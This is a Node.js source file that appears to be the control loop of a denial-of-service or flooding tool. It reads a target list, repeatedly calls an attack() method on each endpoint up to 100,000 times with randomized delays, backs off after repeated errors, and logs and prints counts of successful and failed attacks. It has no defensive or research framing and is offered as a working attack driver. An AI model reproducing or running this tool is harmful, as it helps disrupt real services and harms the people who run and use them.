const { Endpoint } = require("./endpoint");
const { sleep, sleepRand } = require("./helpers");
const pino = require('pino')
const targets = require("./targets.json")

const transport = pino.transport({
  target: './log-transport.mjs',
  options: { destination: `./logs/`, filename: 'attack_.log' }
})
const logger = pino(transport)

const endpoints = targets.map((params) => new Endpoint(params, logger))

const EXECUTION_LIMIT = 100000
const TIMEOUT_BASE = 1000

const run = async () => {
  for (let i = 0; i < EXECUTION_LIMIT; i++) {
    await sleepRand(TIMEOUT_BASE, TIMEOUT_BASE + 1000)
    endpoints.forEach(async endpoint => {
      await sleep(500)
      if (endpoint.stats.errorsInRow > 5)
        endpoint.cooldown(60 * 2) // cooldown for 2 min
      else
        endpoint.attack()
    })

    const stats = {
      s: 0,
      e: 0
    }
    endpoints.forEach(endpoint => { stats.s += endpoint.stats.s; stats.e += endpoint.stats.e })
    console.log(`Successfull ${stats.s} | Errors ${stats.e}`)
  }

}

run().catch(e => { throw e })
